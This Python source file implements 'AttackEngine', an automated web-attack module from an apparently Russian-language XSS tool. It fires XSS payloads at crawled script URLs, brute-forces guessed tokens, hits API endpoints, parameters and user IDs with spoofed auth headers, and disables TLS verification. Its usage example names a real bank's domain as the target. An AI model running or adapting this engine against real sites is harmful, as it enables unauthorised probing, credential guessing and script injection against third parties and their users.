# xss_security_gui/attack_engine.py

import time
import threading
import requests
from urllib.parse import urlparse
import os
import json
import uuid
from collections import Counter
from typing import Any, Dict, Optional, List
from xss_security_gui.auto_modules.dom_and_endpoints import (
    attack_found_targets,
    attack_dom_vectors,
    build_headers_list
)

class AttackEngine:
    """AttackEngine 5.0 — единый движок атак для GUI и CLI"""

    def __init__(self, domain, threat_sender=None, log_func=None):
        self.domain = domain
        self.threat_sender = threat_sender or (lambda *a, **kw: None)
        self.log_func = log_func or (lambda msg, level="info": print(f"[{level}] {msg}"))
        self.results = []
        self.attack_id = str(uuid.uuid4())

        self.default_headers = {
            "User-Agent": "XSS-Security-GUI-AutoAttack/5.0",
            "Accept": "*/*",
        }

        self.header_profiles = [
            {},
            {"X-API-Key": "XSS-KEY"},
            {"Authorization": "Bearer XSS-Token"},
            {"Cookie": "session=XSSSESSION"},
            {"Cookie": "jwt=XSS-JWT"},
        ]

    # === Основний API для GUI ===
    def run_module(self, name: str, data: dict) -> dict:
        short_result = {"module": name, "status": "running", "items": []}
        threading.Thread(target=self._run_module_worker, args=(name, data), daemon=True).start()
        return short_result

    def _run_module_worker(self, name: str, data: dict):
        try:
            items = []
            for key, value in data.items():
                if isinstance(value, list):
                    items.extend(value)
            result = {"status": "done", "items": items, "count": len(items)}
            self._record_result(name, result)
            self.log_func(f"✔️ Модуль {name} завершён. Найдено {len(items)} элементов.", "info")
        except Exception as e:
            result = {"status": "error", "items": [], "error": str(e)}
            self._record_result(name, result)
            self.log_func(f"❌ Ошибка в модуле {name}: {type(e).__name__}: {e}", "error")

    def get_attack_results(self):
        return self.results

    # ===================== Вспомогательные =====================
    def _log(self, msg, level="info"):
        timestamp = time.strftime("%H:%M:%S")
        self.log_func(f"[{timestamp}] {msg}", level=level)

    def _record_result(self, attack_type: str, result: dict):
        normalized = {
            "attack_id": self.attack_id,
            "attack_type": attack_type,
            "domain": self.domain,
            "timestamp": time.time(),
            "severity": result.get("severity", "info"),
            **result
        }
        self.results.append(normalized)
        try:
            self._send_intel(attack_type, normalized)
        except Exception as e:
            self._log(f"⚠️ Ошибка Threat Intel: {e}", level="error")

    def _send_intel(self, attack_type: str, result: dict):
        try:
            self.threat_sender(module=attack_type, target=self.domain, result=result)
        except Exception as e:
            self._log(f"⚠️ Ошибка ThreatSender: {e}", level="warn")

    def _group_by_type(self):
        return dict(Counter(r["attack_type"] for r in self.results))

    # ===================== Payload =====================
    def _normalize_url(self, url: str) -> str:
        url = url.strip()
        if not url:
            return url
        parsed = urlparse(url)
        if url.startswith("//") and not parsed.scheme:
            return "https:" + url
        if not parsed.scheme:
            return "https://" + url.lstrip("/")
        return url

    def _build_request_context(self, url: str, payload: str) -> dict:
        ctx = {
            "method": "GET",
            "url": url,
            "params": {"x": payload},
            "data": None,
            "json": None,
            "headers": {"User-Agent": "XSS-Security-GUI-AutoAttack/1.0", "Accept": "*/*"},
            "cookies": {},
            "timeout": 10,
            "verify": False,
        }
        if "{payload}" in url:
            ctx["url"] = url.replace("{payload}", payload)
            ctx["params"] = {}
        return ctx

    def _send_payload(self, url: str, payload: str, method: str = "GET"):
        """
        Универсальная отправка XSS-пейлоада.
        Поддерживает все основные HTTP-методы.
        """
        try:
            url = self._normalize_url(url)
            ctx = self._build_request_context(url, payload)
            method = method.upper()

            # Универсальный вызов
            resp = requests.request(method, **ctx)
            return resp

        except Exception as e:
            self._log(f"❌ Ошибка _send_payload [{method}]: {e}", level="error")
            return None

    def _make_request(self, method: str, endpoint: str, payload=None, headers=None):
        """
        Универсальный метод для выполнения HTTP-запросов.
        Поддерживает: GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS, TRACE, CONNECT.
        Возвращает (response, elapsed_ms) или (Exception, None).
        """
        headers = headers or {"Content-Type": "application/json"}
        start = time.time()

        try:
            method = method.upper()
            kwargs = {"headers": headers, "timeout": 5}

            if method in ["POST", "PUT", "PATCH", "DELETE", "CONNECT"]:
                kwargs["json"] = {"input": payload}

                # Для методов, где обычно передают параметры
            elif method in ["GET", "HEAD", "OPTIONS", "TRACE"]:
                kwargs["params"] = {"q": payload}

            r = requests.request(method, endpoint, **kwargs)
            elapsed = (time.time() - start) * 1000.0

            # Ограничиваем размер текста для GUI
            if hasattr(r, "text") and len(r.text) > 20000:
                r._text = r.text[:20000]

            return r, elapsed

        except Exception as e:
            self._log(f"❌ Ошибка _make_request [{method}] {endpoint}: {e}", level="error")
            return e, None

    def attack_payload(self, url: str, payload: str) -> dict:
        try:
            response = self._send_payload(url, payload)
            body = response.text if hasattr(response, "text") else str(response)
            reflected = payload in body
            return {"status": "ok", "reflected": reflected, "length": len(body), "response": body}
        except Exception as e:
            self.log_func(f"❌ Ошибка attack_payload: {e}", "error")
            return {"status": "error", "reflected": False, "length": 0, "response": ""}

    def generate_tokens(self):
        import secrets, base64
        static = ["test", "12345", "admin", "guest", "token", "secret", "apikey", "jwt", "bearer", "access", "session"]
        random_tokens = [secrets.token_hex(8), secrets.token_hex(16),
                         base64.b64encode(secrets.token_bytes(12)).decode("utf-8")]
        jwt_like = [f"{secrets.token_hex(4)}.{secrets.token_hex(8)}.{secrets.token_hex(4)}"]
        return static + random_tokens + jwt_like

    # ===================== Автоатаки =====================
    def run_modular_auto_attack(self, crawl_json: dict):
        threading.Thread(
            target=self._run_modular_auto_attack_worker,
            args=(crawl_json,),
            daemon=True
        ).start()

    def _run_modular_auto_attack_worker(self, crawl_json: dict):
        self._log("🧪 Modular AutoAttack 5.0 запущен...")

        try:
            visited = crawl_json.get("visited") or [self.domain]
            base_url = visited[0]

            tokens = crawl_json.get("tokens", [])
            user_ids = crawl_json.get("user_ids", [])
            api_endpoints = crawl_json.get("api_endpoints", [])
            parameters = crawl_json.get("parameters", [])
            xss_targets = crawl_json.get("xss_targets", [])
            scripts = crawl_json.get("scripts", [])
            graphql = crawl_json.get("graphql", [])
            headers_info = crawl_json.get("headers", [])
            csp_info = crawl_json.get("csp_analysis", [])
            secrets = crawl_json.get("secrets", [])
            api_keys = crawl_json.get("api_keys", [])
            forms = crawl_json.get("forms", [])
            errors = crawl_json.get("errors", [])

            # Виклик build_headers_list
            headers_list = build_headers_list(tokens)

            # Виклик JS Endpoint Attacks
            if scripts:
                self._log("🔷 JS Endpoint Attacks...")
                attack_found_targets(self, scripts)

                self._log("🔷 DOM Vector Attacks...")
                attack_dom_vectors(self, scripts)

            # --- Универсальный wrapper ---
            def wrap(module_func, attack_type, *args):
                try:
                    results = module_func(*args) or []
                    for r in results:
                        self._record_result(attack_type, r)
                except Exception as e:
                    self._record_result(attack_type, {
                        "error": str(e),
                        "severity": "error"
                    })
                    self._log(f"❌ Ошибка в модуле {attack_type}: {e}", level="error")

            # --- Импорты модулей атак ---
            from xss_security_gui.auto_modules.dom_and_endpoints import (
                attack_api_endpoints,
                brute_force_tokens,
                attack_parameters,
                attack_user_ids,
                attack_xss_targets,
            )

            session = requests.Session()
            token_candidates = self.generate_tokens()

            # --- Запуск модулей ---
            if api_endpoints:
                self._log("▶️ API Endpoints...")
                wrap(attack_api_endpoints, "api_attack", session, base_url, api_endpoints, headers_list, self._log)

            if token_candidates:
                self._log("▶️ Token Brute Force...")
                wrap(brute_force_tokens, "token_attack", session, base_url, token_candidates, self._log)

            if parameters:
                self._log("▶️ Parameters...")
                wrap(attack_parameters, "param_attack", session, base_url, parameters, self._log)

            if user_ids:
                self._log("▶️ User IDs...")
                wrap(attack_user_ids, "user_attack", session, base_url, user_ids, self._log)

            if xss_targets:
                self._log("▶️ XSS Targets...")
                wrap(attack_xss_targets, "xss_target_attack", session, base_url, xss_targets, self._log)

            # --- GraphQL ---
            if graphql:
                self._log("▶️ GraphQL Endpoints...")
                for ep in graphql:
                    self._record_result("graphql", {"endpoint": ep, "severity": "info"})

            # --- Security Headers ---
            if headers_info:
                self._log("▶️ Security Headers Review...")
                self._record_result("security_headers", {"headers": headers_info, "severity": "info"})

            # --- CSP ---
            if csp_info:
                self._log("▶️ CSP Weakness Scan...")
                self._record_result("csp_analysis", {"csp": csp_info, "severity": "info"})

            # --- Secrets / API Keys ---
            if secrets or api_keys:
                self._log("▶️ Secrets & API Keys...")
                self._record_result("secrets", {"secrets": secrets, "api_keys": api_keys, "severity": "high"})

            # --- Forms ---
            if forms:
                self._log("▶️ Forms & Inputs...")
                self._record_result("forms", {"forms": forms, "severity": "info"})

            # --- Errors / Stacktraces ---
            if errors:
                self._log("▶️ Error Pages & Stacktraces...")
                self._record_result("errors", {"errors": errors, "severity": "warn"})

            self._log("✅ Modular AutoAttack завершён.")

        except Exception as e:
            self._record_result("auto_attack", {
                "target": self.domain,
                "error": str(e),
                "severity": "error"
            })
            self._log(f"❌ Modular AutoAttack ошибка: {type(e).__name__}: {e}", level="error")

    # ===================== Атаки по найденным целям =====================

    def attack_found_targets(self, scripts: List[Dict[str, Any]]) -> None:
        """Атака по найденным точкам (скриптам)."""
        findings = []
        try:
            for s in scripts:
                url = s.get("src") or s.get("url")
                if not url:
                    continue
                for payload in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
                    result = self.attack_payload(url, payload)
                    findings.append({"url": url, "payload": payload, "result": result})

            summary = {
                "status": "done",
                "items": findings,
                "count": len(findings),
                "severity": "high" if findings else "low"
            }
            self._record_result("found_targets", summary)
            self._log(f"✔️ AttackEngine: атака по найденным точкам завершена ({len(findings)} результатов).")
        except Exception as e:
            self._record_result("found_targets", {"status": "error", "items": [], "error": str(e)})
            self._log(f"❌ Ошибка атаки по найденным точкам: {e}", level="error")

    # ===================== Атаки по DOM-векторам =====================

    def attack_dom_vectors(self, scripts: List[Dict[str, Any]]) -> None:
        """Атака по DOM-векторам."""
        findings = []
        try:
            for s in scripts:
                dom_code = s.get("code") or s.get("inline")
                if not dom_code:
                    continue
                if "document.write" in dom_code or "innerHTML" in dom_code:
                    findings.append({"vector": "DOM", "code": dom_code[:120]})

            summary = {
                "status": "done",
                "items": findings,
                "count": len(findings),
                "severity": "medium" if findings else "low"
            }
            self._record_result("dom_vectors", summary)
            self._log(f"✔️ AttackEngine: DOM-вектора проверены ({len(findings)} потенциальных точек).")
        except Exception as e:
            self._record_result("dom_vectors", {"status": "error", "items": [], "error": str(e)})
            self._log(f"❌ Ошибка DOM-атаки: {e}", level="error")

    # ===================== Автоатака =====================

    def run_auto_attack(self, crawl_json: Dict[str, Any],
                        sandbox_info: Optional[Dict[str, Any]] = None,
                        launcher: Optional[callable] = None) -> None:
        """Автоматическая атака на основе данных краулера."""
        self._log("🧨 Запуск автоатаки...")

        def _run():
            try:
                start = time.time()
                if sandbox_info:
                    self._log(f"🛡 Sandbox: {sandbox_info.get('sandboxed', False)}")

                if launcher:
                    try:
                        report = launcher(crawl_json, self._log) or {}
                    except Exception as e:
                        report = {"error": str(e)}
                else:
                    self.run_modular_auto_attack(crawl_json)
                    report = {"status": "modular_auto_attack"}

                elapsed = (time.time() - start) * 1000.0
                result = {
                    "target": crawl_json.get("url", self.domain),
                    "sandbox": bool(sandbox_info.get("sandboxed")) if isinstance(sandbox_info, dict) else False,
                    "sandbox_info": sandbox_info or {},
                    "report": report,
                    "elapsed_ms": elapsed,
                    "severity": "n/a"
                }
                self._record_result("auto_attack", result)
                self._log(f"✔️ Автоатака завершена за {elapsed:.0f}ms.")
            except Exception as e:
                self._record_result("auto_attack", {"target": self.domain, "error": str(e), "severity": "error"})
                self._log(f"❌ Ошибка автоатаки: {type(e).__name__}: {e}", level="error")

        threading.Thread(target=_run, daemon=True, name="AutoAttackThread").start()

    # ===================== Экспорт и Сводка =====================

    def export_results(self, path: Optional[str] = None) -> str:
        """Экспортирует все накопленные результаты в JSON-файл."""
        try:
            if path is None:
                export_dir = os.path.join(os.getcwd(), "exports")
                os.makedirs(export_dir, exist_ok=True)
                path = os.path.join(
                    export_dir,
                    f"attack_results_{self.domain}_{time.strftime('%Y%m%d_%H%M%S')}.json"
                )
            else:
                os.makedirs(os.path.dirname(path), exist_ok=True)

            summary = self.get_summary()
            summary["results"] = sorted(self.results, key=lambda x: x.get("attack_type", ""))

            with open(path, "w", encoding="utf-8") as f:
                json.dump(summary, f, indent=2, ensure_ascii=False)

            self._log(f"💾 Результаты атак сохранены: {path}", level="info")
            return path
        except Exception as e:
            self._log(f"❌ Ошибка экспорта результатов: {type(e).__name__}: {e}", level="error")
            return ""

    def get_summary(self) -> Dict[str, Any]:
        """Возвращает сводку по результатам атак."""
        high = sum(1 for r in self.results if r.get("severity") == "high")
        errors = sum(1 for r in self.results if r.get("severity") == "error")

        return {
            "attack_id": self.attack_id,
            "domain": self.domain,
            "count": len(self.results),
            "high": high,
            "errors": errors,
            "by_type": self._group_by_type(),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }

    def send_summary_to_threat_intel(self) -> None:
        """Отправляет сводку и результаты в Threat Intel."""
        summary = self.get_summary()
        try:
            self._send_intel("attack_summary", summary)
            self._send_intel("attack_results", {"results": self.results})
            self._log("📤 Сводка и результаты отправлены в Threat Intel.")
        except Exception as e:
            self._log(f"❌ Ошибка отправки сводки: {type(e).__name__}: {e}", level="error")





if __name__ == "__main__":
    # Пример использования AttackEngine для теста экспорта
    engine = AttackEngine("gazprombank.ru")

    # Добавляем фиктивный результат
    engine._record_result("XSS Targets", {
        "status": "done",
        "items": ["https://gazprombank.ru/search?q={payload}"]
    })

    # Экспортируем результаты в JSON
    path = engine.export_results()
    print(f"Файл сохранён: {path}")